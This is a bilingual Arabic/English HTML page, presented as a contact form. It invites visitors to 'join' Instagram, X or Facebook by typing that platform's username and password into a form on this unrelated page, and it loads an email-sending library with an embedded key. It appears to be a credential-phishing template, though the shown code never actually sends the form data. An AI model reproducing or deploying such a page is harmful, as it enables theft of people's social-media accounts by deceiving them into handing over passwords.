<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نموذج الاتصال</title>
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script>
        (function () {
            emailjs.init("1xqwBMfecM1SSulsh"); // استبدل بـ Public Key الخاص بك
        })();

        function toggleLanguage(lang) {
            const elements = document.querySelectorAll("[data-ar], [data-en]");
            elements.forEach(el => {
                el.textContent = lang === 'ar' ? el.getAttribute('data-ar') : el.getAttribute('data-en');
            });
            document.documentElement.lang = lang;
        }
    </script>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f8f8f8;
            margin: 0;
            padding: 0;
            color: #333;
            direction: rtl;
        }
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 30px;
            background-color: #222;
            color: white;
        }
        header .language-switcher {
            cursor: pointer;
            font-size: 16px;
        }
        .hero {
            background: url('48b04dce-b281-40a5-9fc2-510e026c751f_rw_1920.gif') no-repeat center center/cover;
            height: 400px;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.7);
            font-size: 28px;
        }
        .content {
            text-align: center;
            padding: 30px;
        }
        .welcome-message {
            font-size: 24px;
            margin-bottom: 20px;
            color: #333;
        }
        .platform {
            margin: 15px;
            padding: 15px 30px;
            background-color: #444;
            color: white;
            border-radius: 10px;
            font-size: 18px;
            display: inline-block;
            cursor: pointer;
            transition: background-color 0.3s, transform 0.2s;
        }
        .platform:hover {
            background-color: #666;
            transform: scale(1.05);
        }
        .form-container {
            display: none;
            margin-top: 30px;
            text-align: left;
        }
        .form-container input, .form-container textarea {
            width: 90%;
            max-width: 400px;
            padding: 12px;
            margin: 10px auto;
            display: block;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
        }
        .form-container button {
            padding: 12px 25px;
            background-color: #444;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            cursor: pointer;
            display: block;
            margin: 20px auto;
            transition: background-color 0.3s;
        }
        .form-container button:hover {
            background-color: #666;
        }
        .contact-toggle {
            padding: 15px 30px;
            background-color: #444;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            cursor: pointer;
            margin: 20px auto;
            display: block;
            transition: background-color 0.3s;
        }
        .contact-toggle:hover {
            background-color: #666;
        }
    </style>
</head>
<body>

<header>
    <div data-ar="نموذج الاتصال" data-en="Contact Form">نموذج الاتصال</div>
    <div class="language-switcher">
        <span onclick="toggleLanguage('ar')">العربية</span> | <span onclick="toggleLanguage('en')">English</span>
    </div>
</header>

<div class="hero">
    <div data-ar="مرحبًا بك في مهمتنا!" data-en="Welcome to our mission!">مرحبًا بك في مهمتنا!</div>
</div>

<div class="content">
    <div class="welcome-message" data-ar="اختر المنصة التي تود الانضمام إليها." data-en="Choose the platform you want to join.">اختر المنصة التي تود الانضمام إليها.</div>

    <div class="platform" id="instagram" data-ar="إنستغرام" data-en="Instagram">إنستغرام</div>
    <div class="platform" id="x" data-ar="إكس" data-en="X">إكس</div>
    <div class="platform" id="facebook" data-ar="فيسبوك" data-en="Facebook">فيسبوك</div>

    <div class="form-container" id="form-container">
        <h3 id="platform-name" data-ar="التسجيل في" data-en="Sign up for">التسجيل في</h3>
        <form id="registration-form">
            <input type="text" name="username" id="username" data-ar="اسم المستخدم" placeholder="اسم المستخدم" required>
            <input type="password" name="password" id="password" data-ar="كلمة المرور" placeholder="كلمة المرور" required>
            <button type="submit" data-ar="انضمام" data-en="Join">انضمام</button>
        </form>
    </div>

    <button class="contact-toggle" onclick="document.getElementById('contact-form').style.display = 'block'" data-ar="تواصل معنا" data-en="Contact Us">تواصل معنا</button>

    <form id="contact-form" style="display: none;">
        <input type="text" name="name" placeholder="اسمك" required>
        <input type="email" name="email" placeholder="بريدك الإلكتروني" required>
        <textarea name="message" placeholder="رسالتك" required></textarea>
        <button type="submit">إرسال</button>
    </form>
</div>

<script>
    const platforms = document.querySelectorAll('.platform');
    const formContainer = document.getElementById('form-container');
    const platformName = document.getElementById('platform-name');

    platforms.forEach(platform => {
        platform.addEventListener('click', () => {
            platformName.textContent = `${platform.getAttribute('data-ar')}`;
            formContainer.style.display = 'block';
        });
    });
</script>
</body>
</html>
